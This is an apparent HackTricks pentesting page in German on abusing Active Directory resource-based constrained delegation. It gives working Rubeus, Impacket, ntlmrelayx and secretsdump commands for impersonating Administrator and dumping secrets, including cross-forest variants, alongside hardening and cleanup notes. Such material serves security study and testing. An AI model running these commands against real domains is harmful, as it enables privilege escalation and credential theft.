# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen von Resource-based Constrained Delegation

Dies ähnelt der grundlegenden [Constrained Delegation](constrained-delegation.md), aber **anstatt** einem **Objekt** Berechtigungen zu erteilen, sich gegenüber einem Computer als **beliebiger Benutzer auszugeben**, **legt** Resource-based Constrain Delegation **im Objekt fest, wer sich gegenüber ihm als beliebiger Benutzer ausgeben darf**.<sup>[[12]](#references)</sup>

In diesem Fall verfügt das eingeschränkte Objekt über ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, das den Namen des Benutzers enthält, der sich ihm gegenüber als jeder andere Benutzer ausgeben darf.

Ein weiterer wichtiger Unterschied dieser Constrained Delegation zu den anderen Delegationsarten besteht darin, dass jeder Benutzer mit **Schreibberechtigungen für ein Computerkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/usw._) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** festlegen kann (bei den anderen Delegationsformen waren Domain-Admin-Rechte erforderlich).<sup>[[1]](#references)</sup>

### Neue Konzepte

Bei Constrained Delegation wurde erklärt, dass das **`TrustedToAuthForDelegation`**-Flag innerhalb des _userAccountControl_-Werts des Benutzers erforderlich ist, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht vollständig richtig.\
Tatsächlich kann man auch ohne diesen Wert ein **S4U2Self** gegenüber jedem Benutzer durchführen, wenn man ein **Service** ist (über einen SPN verfügt). Wenn man jedoch **`TrustedToAuthForDelegation`** besitzt, ist das zurückgegebene TGS **Forwardable**, und wenn man dieses Flag **nicht besitzt**, ist das zurückgegebene TGS **nicht** **Forwardable**.

Wenn das für **S4U2Proxy** verwendete **TGS** **nicht Forwardable** ist, funktioniert der Versuch, eine **grundlegende Constrain Delegation** auszunutzen, **nicht**. Wenn man jedoch versucht, eine **Resource-Based constrain delegation** auszunutzen, funktioniert es.<sup>[[1]](#references)[[2]](#references)</sup>

### Angriffsstruktur

> Wenn du **Schreibberechtigungen mit gleichwertigen Auswirkungen** für ein **Computer**-Konto besitzt, kannst du **privilegierten Zugriff** auf diesem Computer erlangen.

Angenommen, der Angreifer verfügt bereits über **Schreibberechtigungen mit gleichwertigen Auswirkungen für den Computer des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto, das über einen **SPN** verfügt, oder **erstellt eines** („Service A“). Beachte, dass jeder _Admin User_ ohne weitere spezielle Berechtigungen bis zu 10 Computerobjekte (**_MachineAccountQuota_**) **erstellen** und ihnen einen **SPN** zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und ihm einen SPN zuweisen.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** für den Computer des Opfers (ServiceB), um **Resource-based constrained delegation** so zu konfigurieren, dass ServiceA sich gegenüber diesem Computer des Opfers (ServiceB) als beliebiger Benutzer ausgeben darf.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten Konto mit SPN): Fordere ein **TGS von Administrator an mich** an (nicht Forwardable).
2. S4U2Proxy: Verwende das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** für den **Host des Opfers** anzufordern.
3. Auch wenn du ein nicht Forwardable TGS verwendest, funktioniert es, da du Resource-based constrained delegation ausnutzt.
4. Der Angreifer kann **pass-the-ticket** verwenden und sich als der Benutzer **ausgeben**, um **Zugriff auf den Opfer-ServiceB** zu erlangen.<sup>[[1]](#references)</sup>

Um die _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Du kannst mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> ein Computerobjekt innerhalb der Domäne erstellen.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren der ressourcenbasierten eingeschränkten Delegation

**Unter Verwendung des activedirectory PowerShell-Moduls**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Mit powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführen eines vollständigen S4U attack (Windows/Rubeus)

Zuerst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Du kannst mit einer einzigen Anfrage mithilfe des Parameters `/altservice` von Rubeus weitere Tickets für zusätzliche Services generieren:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachte, dass Benutzer ein Attribut namens "**Cannot be delegated**" haben. Wenn dieses Attribut bei einem Benutzer auf True gesetzt ist, kannst du dich nicht als dieser Benutzer ausgeben. Diese Eigenschaft ist in BloodHound sichtbar.

### Linux-Tools: Durchgängiges RBCD mit Impacket (2024+)

Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notizen
- Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES keys; viele moderne Domains schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only flows.
- Impacket kann für einige Tools den `sname` ("AnySPN") umschreiben, aber ermittle nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Wenn der **delegating principal**, den du kontrollierst, in einer **anderen Domain** (oder sogar einer **anderen forest**) als der **resource computer** lebt, handelt es sich weiterhin um **RBCD**. Der Ticket flow entspricht jedoch nicht mehr dem üblichen domainweiten `S4U2Self -> S4U2Proxy`.

### Cross-domain RBCD: foreign principal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domain** setzt, kann der foreign machine/user im LDAP der Zieldomain möglicherweise **nicht per Name aufgelöst** werden. Konfiguriere den Delegationseintrag in diesem Fall mit der **SID** des foreign principal anstelle seines sAMAccountName/UPN.

Dies ist besonders relevant, wenn NTLM mit `ntlmrelayx.py` an LDAP weitergeleitet wird:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domäne stammt.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Schreibvorgang dennoch erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domänenübergreifendes RBCD: domänenübergreifende S4U-Sequenz

Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` eingetragen ist, funktioniert der domänenübergreifende Ablauf wie folgt:<sup>[[9]](#references)[[13]](#references)</sup>

1. Einen **TGT** für den delegierenden Principal aus dessen eigener Domäne abrufen.
2. Einen **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Eine **domänenübergreifende S4U2Self-Referral** für den zu imitierenden Benutzer beim DC der Zieldomäne anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer wieder in der delegierenden Domäne anfordern.
5. **S4U2Proxy** in der delegierenden Domäne ausführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem DC der Zieldomäne ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Dies ist der Grund, warum standardmäßige Linux-Tools bei domänenübergreifendem RBCD häufig fehlschlagen:<sup>[[9]](#references)</sup>
- Der **Realm** der Anfrage muss möglicherweise vom Realm des im `TGS-REQ` verwendeten TGT abweichen.
- Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur `S4U2Self` oder `S4U2Self`, unmittelbar gefolgt von einem einzelnen `S4U2Proxy`.

### Domänenübergreifendes RBCD unter Linux

Synacktiv hat eine Impacket-Implementierung von `getST.py` veröffentlicht, die die domänenübergreifende Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativ lauten die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domain
- `-targetdomain`: Domain des **Resource-Computers**
- `-targetdc`: DC der **Resource**-Domain

### Einschränkungen bei Cross-forest RBCD

Cross-forest RBCD hat eine wichtige Einschränkung: **Der impersonated user muss derselben Forest angehören wie der delegating principal**. Wenn sich dein kontrollierter Machine Account also in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD gegenüber dieser Ressource impersonaten.<sup>[[9]](#references)</sup>

Es bleibt dennoch ausnutzbar, wenn:
- der Benutzer aus der **delegierenden Forest** auf dem Resource Host in der anderen Forest **local admin** (oder anderweitig privilegiert) ist
- ein Trust den erforderlichen Authentication Path erlaubt und die fremde SID im Security Descriptor des Zielcomputers akzeptiert wird

### Cross-forest-RBCD-Protokollbesonderheiten

Cross-forest RBCD ist nicht einfach nur „cross-domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die gängige Tools historisch übersehen:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein finales Service Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Einen TGT für den delegating principal in Forest A erhalten.
2. **S4U2Self** für den impersonated user in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral TGT für Forest B zu erhalten.
4. Ein zweites **S4U2Proxy** in Forest A **ohne das S4U2Self-Ticket als zusätzliches Ticket**, jedoch mit aktiviertem `branch-aware`, senden, um ein weiteres Referral TGT für Forest B zu erhalten.
5. Optional ein normales Service Ticket in Forest B für den delegating principal anfordern (dieses Ticket ist für den finalen Abuse nicht erforderlich).
6. Die Referral Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den impersonated forest-A user zum Ziel-SPN anzufordern.

### Cross-forest RBCD von Linux

Der gleiche Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Schalter hinzu:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursives Multi-Domain-RBCD (3+ Domänen)

In **Forests mit mehreren Domänen** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domäne des impersonierten Benutzers** gesendet, Zwischenwechsel zwischen übergeordneten und untergeordneten Domänen werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der **eigenen Domäne des delegierenden Principals** gesendet.
- Das bedeutet, dass **allein der Besitz eines TGTs** für ein Maschinenkonto ausreichen kann, um sich als **Administrator aus einer anderen Domäne innerhalb desselben Forests** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Zwischenstationen verwenden das vorherige Ticket erneut als TGT, während sie die nächste `krbtgt/<REALM>`-Weiterleitung anfordern. Nur der letzte Hop gibt das finale Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less Cross-Domain / Cross-Forest RBCD

Wenn der **delegierende Principal ein Benutzer ohne SPN** ist, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** zu wiederholen.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC zu **RC4-HMAC (Etype 23)** gelenkt wird.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Session-Key** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers durch diesen **Session-Key** ersetzen, indem `changepasswd.py -newhashes <session_key>` verwendet wird.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage erneut als **`-additional-ticket`** verwenden.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Betriebliche Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware**-Algorithmus (`getST.py ... -forest`) verwendet werden, um das native Verhalten von Windows abzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der rekursive Flow ohne branch awareness weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen, da RC4 deprecated ist. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` vor der Änderung des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Keys des Kontos **nicht** neu. Wird die Passwortänderung zuerst durchgeführt, können spätere Ticket-Anfragen fehlschlagen.<sup>[[14]](#references)</sup>
- Das impersonierte Konto muss weiterhin **delegierbar** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.

## Hinweise zu Detection / Hardening

- RBCD-Pfade über Domains/Forests hinweg werden weiterhin meist durch **ACL abuse** oder **relay-to-LDAP** erstellt. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
- Überprüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` auf Computerobjekten schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Überprüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugriff

Die letzte Kommandozeile führt den **vollständigen S4U-Angriff aus und injiziert den TGS** von Administrator zum Zielhost in den **Speicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Service von Administrator angefordert, sodass du auf **C$** zugreifen kannst:
```bash
ls \\victim.domain.local\C$
```
### Verschiedene Service-Tickets missbrauchen

Erfahre mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Auditierung und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (Dekodierung der SD zur Auflösung von SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (mit einem Befehl auslesen oder leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash übergibst. Übergib an Rubeus mindestens den AES256-Hash (oder übergib ihm einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Wiederhole den **letzten Hop** als **`S4U2Self+U2U`** statt als reguläres **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Neuere DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick **`S4U2Self+U2U`** + Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed**-RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes nicht für den Login funktionieren. Möglicherweise hast du beim Generieren der Hashes vergessen, das `$` in den Benutzernamen einzufügen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: Dies kann Folgendes bedeuten:
- Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Service zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Privilegien verfügt).
- Der angeforderte Service existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht ausgeführt wird).
- Der erstellte Fakecomputer hat seine Privilegien auf dem verwundbaren Server verloren und du musst sie ihm zurückgeben.
- Du missbrauchst klassisches KCD. Denke daran: RBCD funktioniert mit nicht weiterleitbaren `S4U2Self`-Tickets, während KCD weiterleitbare Tickets erfordert.

## Hinweise, Relays und Alternativen

- Du kannst die RBCD-SD auch über Active Directory Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokalen SYSTEM-Zugriff zu erlangen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Computerkonto erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für dein Computerkonto am Ziel-Computerobjekt setzen und dich anschließend sofort über S4U von außerhalb des Hosts als **Administrator** impersonieren.<sup>[[8]](#references)</sup>

## Referenzen

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
